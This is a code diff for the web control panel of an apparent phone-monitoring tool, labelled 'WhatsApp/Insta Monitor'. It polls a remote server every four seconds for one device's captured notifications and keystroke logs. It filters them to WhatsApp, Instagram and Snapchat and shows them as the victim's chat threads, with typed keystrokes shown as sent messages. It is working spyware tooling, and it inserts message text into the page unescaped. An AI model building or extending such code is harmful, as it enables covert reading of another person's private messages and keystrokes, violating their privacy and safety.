@@ -3,28 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Live Monitor</title>
+    <title>WhatsApp/Insta Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- CSS STYLES (WhatsApp Dark Mode) --- */
+        /* --- CSS STYLES --- */
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
 
-        /* Sidebar */
+        /* Left Sidebar */
         .sidebar { width: 350px; background-color: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; height: 100%; }
         .header { background-color: #202c33; padding: 15px; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; color: #aebac1; }
         
         .contact-list { flex: 1; overflow-y: auto; }
         
-        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 55px; } 
+        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 60px; } 
         .contact:hover { background-color: #2a3942; }
         .contact.active { background-color: #2a3942; }
 
         .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 15px; flex-shrink: 0; font-size: 18px; font-weight: bold; }
         .info { flex: 1; display: flex; flex-direction: column; justify-content: center; }
         .name { font-size: 17px; color: #e9edef; font-weight: 500; }
-        .last-msg { font-size: 13px; color: #8696a0; margin-top: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px; }
+        .last-msg { font-size: 13px; color: #8696a0; margin-top: 4px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; max-width: 200px; }
 
-        /* Chat Area */
+        /* Right Chat Area */
         .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; position: relative; }
         
         .chat-header { background-color: #202c33; padding: 10px 15px; display: flex; align-items: center; border-bottom: 1px solid #374045; }
@@ -32,39 +32,20 @@
 
         .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; }
         
-        /* 🔥 BUBBLES (Left vs Right) */
-        .msg { 
-            max-width: 65%; 
-            padding: 6px 10px; 
-            border-radius: 8px; 
-            font-size: 14.5px; 
-            line-height: 1.4; 
-            word-wrap: break-word; 
-            color: #e9edef; 
-            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); 
-            position: relative; 
-            margin-bottom: 4px;
-        }
+        /* Message Bubbles */
+        .msg { max-width: 70%; padding: 6px 10px; border-radius: 8px; font-size: 14.5px; line-height: 1.4; word-wrap: break-word; color: #e9edef; position: relative; margin-bottom: 4px; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
         
-        /* Received (Left - Gray) */
-        .msg.incoming {
-            background-color: #202c33;
-            align-self: flex-start; 
-            border-top-left-radius: 0;
-        }
+        /* Incoming (Notification) -> LEFT */
+        .msg.incoming { background-color: #202c33; align-self: flex-start; border-top-left-radius: 0; }
 
-        /* Sent (Right - Green) */
-        .msg.outgoing {
-            background-color: #005c4b;
-            align-self: flex-end; 
-            border-top-right-radius: 0;
-        }
+        /* Outgoing (Keylogs) -> RIGHT */
+        .msg.outgoing { background-color: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
         
         .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 6px; }
         .welcome-screen { position: absolute; top:0; left:0; width:100%; height:100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #222e35; z-index: 5; text-align: center; }
 
-        /* Debug Box */
-        #status-bar { position: fixed; bottom: 0; left: 0; background: #00a884; color: white; padding: 5px 10px; font-size: 12px; display: none; z-index: 100; }
+        /* Debug Status */
+        #debug-bar { position: fixed; bottom:0; left:0; width:100%; background: #a80000; color: white; font-size:12px; padding:2px; text-align:center; display:none; z-index:100;}
 
         @media (max-width: 768px) {
             .sidebar { width: 100%; position: absolute; z-index: 20; }
@@ -82,12 +63,12 @@
         <div class="header">
             <span>Chats</span>
             <div style="display:flex; gap:15px;">
-                 <i class="fas fa-trash" onclick="clearData()" style="cursor:pointer; font-size:14px;" title="Clear"></i>
-                 <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer;" title="Refresh"></i>
+                <i class="fas fa-trash" onclick="clearData()" style="cursor:pointer; font-size:14px;" title="Clear"></i>
+                <i class="fas fa-sync-alt" onclick="refreshData()" style="cursor:pointer;" title="Refresh"></i>
             </div>
         </div>
         <div class="contact-list" id="contactList">
-            <div style="text-align:center; padding:20px; color:#8696a0;">Connecting to Server...</div>
+            <div style="text-align:center; padding:20px; color:#8696a0;">Connecting...</div>
         </div>
     </div>
 
@@ -95,7 +76,7 @@
         <div class="welcome-screen" id="welcomeScreen">
             <i class="fab fa-whatsapp" style="font-size: 60px; color: #3d4a51; margin-bottom: 20px;"></i>
             <div style="font-size: 24px;">WhatsApp Monitor</div>
-            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">Select a contact to view history</div>
+            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">Syncing Notifications & Keystrokes</div>
         </div>
 
         <div class="chat-header" id="chatHeader" style="display:none;">
@@ -107,89 +88,114 @@
         <div class="messages" id="messageBox"></div>
     </div>
     
-    <div id="status-bar"></div>
+    <div id="debug-bar"></div>
 
     <script>
-        // 🔥 CONFIGURATION
+        // --- CONFIGURATION ---
         const urlParams = new URLSearchParams(window.location.search);
-        const deviceId = urlParams.get('id'); // ID URL se lega
+        const deviceId = urlParams.get('id');
 
-        // Server URL (Ensure this matches your Render URL)
-        const BASE_URL = "https://child-v9no.onrender.com";
-        const API_URL = `${BASE_URL}/api/get-data/${deviceId}/notifications`;
+        // 🔥 IMPORTANT: Check these paths match your server
+        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
+        const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`; 
 
-        const STORAGE_KEY = `whatsapp_v2_${deviceId || 'demo'}`;
+        const STORAGE_KEY = `chat_monitor_v3_${deviceId || 'default'}`;
         let groupedChats = {};
         let activeChatUser = null; 
 
-        // Initial Check
-        if (!deviceId) {
-            document.getElementById('contactList').innerHTML = `<div style="padding:20px; color:red; text-align:center">Error: ID Missing.<br>Add ?id=YOUR_DEVICE_ID to URL</div>`;
-        }
+        // 1. Start System
+        if(!deviceId) alert("Please add ?id=YOUR_DEVICE_ID to the URL");
+        loadFromStorage();
+        refreshData();
+        setInterval(refreshData, 4000); // 4 sec refresh
 
-        // 1. FETCH DATA
-        async function fetchData() {
+        // 2. Data Fetching (Both APIs)
+        async function refreshData() {
             if (!deviceId) return;
-            showStatus("Fetching...");
-            
             try {
-                const res = await fetch(API_URL);
-                if (!res.ok) throw new Error("Server Error or No Data");
-                
-                const data = await res.json();
-                
-                // DATA PROCESSING
-                processData(data);
-                showStatus("Updated: " + new Date().toLocaleTimeString());
+                // Fetch both at the same time
+                const [notifRes, keyRes] = await Promise.allSettled([
+                    fetch(API_NOTIFS),
+                    fetch(API_KEYLOGS)
+                ]);
 
-            } catch (e) {
-                console.error("Fetch Error:", e);
-                showStatus("Error fetching data (Server might be sleeping)");
-            }
+                // Handle Notifications
+                let notifications = [];
+                if(notifRes.status === 'fulfilled' && notifRes.value.ok) {
+                    notifications = await notifRes.value.json();
+                }
+
+                // Handle Keylogs
+                let keylogs = [];
+                if(keyRes.status === 'fulfilled' && keyRes.value.ok) {
+                    keylogs = await keyRes.value.json();
+                } else {
+                    // Agar Keylog fail ho jaye to debug bar dikhao
+                    document.getElementById('debug-bar').style.display = 'block';
+                    document.getElementById('debug-bar').innerText = "Warning: Keylogs API empty or failed.";
+                }
+
+                processMergedData(notifications, keylogs);
+
+            } catch (e) { console.error("Sync Error:", e); }
         }
 
-        // 2. PROCESS & GROUP MESSAGES
-        function processData(data) {
-            if (!data || !Array.isArray(data) || data.length === 0) {
-                if (Object.keys(groupedChats).length === 0) {
-                    document.getElementById('contactList').innerHTML = `<div style="text-align:center; padding:20px; color:#8696a0;">No Data on Server yet.</div>`;
-                }
-                return;
-            }
-
+        // 3. MERGE & PROCESS LOGIC
+        function processMergedData(notifications, keylogs) {
             let tempGrouped = {};
-            
-            data.forEach(msg => {
-                // Filter: Only WhatsApp
-                const appName = (msg.packageName || msg.appName || msg.app || "").toLowerCase();
-                if (!appName.includes('whatsapp')) return;
 
-                // Sender Name identify karna
-                let sender = msg.title || "Unknown";
-                
-                // Agar sender "WhatsApp" hai, to ignore karo (ye system notification hoti hai)
-                if (sender === "WhatsApp") return;
+            // Helper to get allowed apps
+            const isTargetApp = (name) => {
+                const n = (name || "").toLowerCase();
+                return n.includes('whatsapp') || n.includes('instagram') || n.includes('snapchat');
+            };
 
-                if (!tempGrouped[sender]) tempGrouped[sender] = [];
+            // --- STEP A: Notifications (INCOMING - Left) ---
+            notifications.forEach(msg => {
+                if (!isTargetApp(msg.packageName) && !isTargetApp(msg.appName)) return;
                 
-                // Data normalize karna (Time, Text)
-                tempGrouped[sender].push({
-                    text: msg.text || msg.message || "",
-                    time: msg.postTime || msg.timestamp || Date.now(),
-                    isSelf: (msg.title === "You" || msg.title === "Me" || (msg.text && msg.text.startsWith("You:")))
+                let name = msg.title || "Unknown";
+                if (name === "WhatsApp" || name === "Instagram") return; // Ignore system titles
+
+                if (!tempGrouped[name]) tempGrouped[name] = [];
+
+                tempGrouped[name].push({
+                    text: msg.text,
+                    time: parseInt(msg.postTime || Date.now()),
+                    type: 'incoming'
                 });
             });
 
-            // Save & Render
-            if (Object.keys(tempGrouped).length > 0) {
-                groupedChats = tempGrouped;
-                localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
-                renderSidebar();
-                if (activeChatUser) renderMessages(activeChatUser, true);
+            // --- STEP B: Keylogs (OUTGOING - Right) ---
+            keylogs.forEach(log => {
+                if (!isTargetApp(log.appName)) return;
+
+                // Important: Keylog must have 'title' (Window Title) to match the contact
+                let name = log.title || "Unknown";
+                
+                // Only add outgoing if we have a chat for them OR create new if consistent
+                if (!tempGrouped[name]) tempGrouped[name] = [];
+
+                tempGrouped[name].push({
+                    text: log.text || log.message || "", 
+                    time: parseInt(log.timestamp || log.postTime || Date.now()),
+                    type: 'outgoing'
+                });
+            });
+
+            // --- STEP C: Sort and Save ---
+            for (let name in tempGrouped) {
+                tempGrouped[name].sort((a, b) => a.time - b.time);
             }
+
+            groupedChats = tempGrouped;
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
+            
+            renderSidebar();
+            if (activeChatUser) renderMessages(activeChatUser, true);
         }
 
-        // 3. RENDER SIDEBAR
+        // 4. RENDER SIDEBAR
         function renderSidebar() {
             const list = document.getElementById('contactList');
             list.innerHTML = "";
@@ -200,6 +206,11 @@
                 return msgsB[msgsB.length - 1].time - msgsA[msgsA.length - 1].time;
             });
 
+            if (sortedNames.length === 0) {
+                list.innerHTML = `<div style="text-align:center; padding:20px; color:#8696a0;">No Data Found</div>`;
+                return;
+            }
+
             sortedNames.forEach(name => {
                 const msgs = groupedChats[name];
                 const lastMsg = msgs[msgs.length - 1];
@@ -209,6 +220,9 @@
                 if (name === activeChatUser) div.classList.add('active');
                 div.onclick = () => openChat(name);
                 
+                // Show tick for outgoing
+                let preview = lastMsg.type === 'outgoing' ? `<i class="fas fa-check"></i> ${lastMsg.text}` : lastMsg.text;
+                
                 div.innerHTML = `
                     <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                     <div class="info">
@@ -216,50 +230,63 @@
                             <span class="name">${name}</span>
                             <span style="font-size:11px; color:#8696a0;">${formatTime(lastMsg.time)}</span>
                         </div>
-                        <div class="last-msg">${lastMsg.text}</div>
+                        <div class="last-msg">${preview}</div>
                     </div>
                 `;
                 list.appendChild(div);
             });
         }
 
-        // 4. RENDER MESSAGES (Left/Right Logic)
+        // 5. RENDER MESSAGES (With Your Filter Logic Restored)
         function renderMessages(name, isAutoRefresh) {
             const box = document.getElementById('messageBox');
+            // Auto scroll logic
             const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 100;
 
             if (!groupedChats[name]) return;
 
-            let html = "";
+            let finalHtml = "";
             let uniqueMsgs = [];
-            let lastTxt = "";
+            
+            // --- 🔥 SPECIAL FILTERING LOGIC ---
+            // Tumhara logic: Repeat messages remove karna aur 
+            // agar naya message purane ka hi bada version hai to replace karna
+            
+            let lastMsg = null;
 
-            // Simple Deduplication
-            groupedChats[name].sort((a,b) => a.time - b.time).forEach(m => {
-                if (m.text === lastTxt) return;
-                uniqueMsgs.push(m);
-                lastTxt = m.text;
-            });
+            groupedChats[name].forEach(msg => {
+                let txt = (msg.text || "").trim();
+                if (!txt) return;
 
-            uniqueMsgs.forEach(msg => {
-                // Determine Class: Incoming or Outgoing
-                // Agar title "You" hai ya text "You:" se start ho raha hai -> Outgoing
-                let msgClass = "incoming";
-                let displayText = msg.text;
+                if (lastMsg) {
+                    // 1. Exact Duplicate Filter
+                    if (txt === lastMsg.text && msg.type === lastMsg.type) {
+                        return; // Skip duplicate
+                    }
 
-                if (msg.isSelf || displayText.startsWith("You:")) {
-                    msgClass = "outgoing";
-                    displayText = displayText.replace(/^You:\s*/, ""); // "You:" हटा दो
+                    // 2. Partial Update Filter (Only for incoming)
+                    // E.g. "H" -> "He" -> "Hello"
+                    if (msg.type === 'incoming' && lastMsg.type === 'incoming') {
+                        if (txt.includes(lastMsg.text) && txt.length > lastMsg.text.length) {
+                            uniqueMsgs.pop(); // Remove partial message
+                        }
+                    }
                 }
 
-                html += `
-                    <div class="msg ${msgClass}">
-                        ${displayText}
+                uniqueMsgs.push(msg);
+                lastMsg = msg; // Update reference
+            });
+
+            // Generate HTML
+            uniqueMsgs.forEach(msg => {
+                finalHtml += `
+                    <div class="msg ${msg.type}">
+                        ${msg.text}
                         <span class="time">${formatTime(msg.time)}</span>
                     </div>`;
             });
 
-            box.innerHTML = html;
+            box.innerHTML = finalHtml;
 
             if (!isAutoRefresh || isScrolledToBottom) {
                 box.scrollTop = box.scrollHeight;
@@ -283,32 +310,24 @@
             renderSidebar();
         }
 
-        function formatTime(ts) {
-            return new Date(parseInt(ts)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-        }
-
-        function showStatus(msg) {
-            const el = document.getElementById('status-bar');
-            el.innerText = msg;
-            el.style.display = 'block';
-            setTimeout(() => el.style.display = 'none', 3000);
+        function loadFromStorage() {
+            const saved = localStorage.getItem(STORAGE_KEY);
+            if(saved) {
+                groupedChats = JSON.parse(saved);
+                renderSidebar();
+            }
         }
 
         function clearData() {
-            if(confirm("Clear Local Cache?")) {
+            if(confirm("Delete all saved chats?")) {
                 localStorage.removeItem(STORAGE_KEY);
                 location.reload();
             }
         }
 
-        // STARTUP
-        // 1. Local data load karo
-        const saved = localStorage.getItem(STORAGE_KEY);
-        if(saved) { groupedChats = JSON.parse(saved); renderSidebar(); }
-
-        // 2. Fetch start karo
-        fetchData();
-        setInterval(fetchData, 4000); // Har 4 second me refresh
+        function formatTime(ts) {
+            return new Date(ts).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+        }
 
     </script>
 </body>
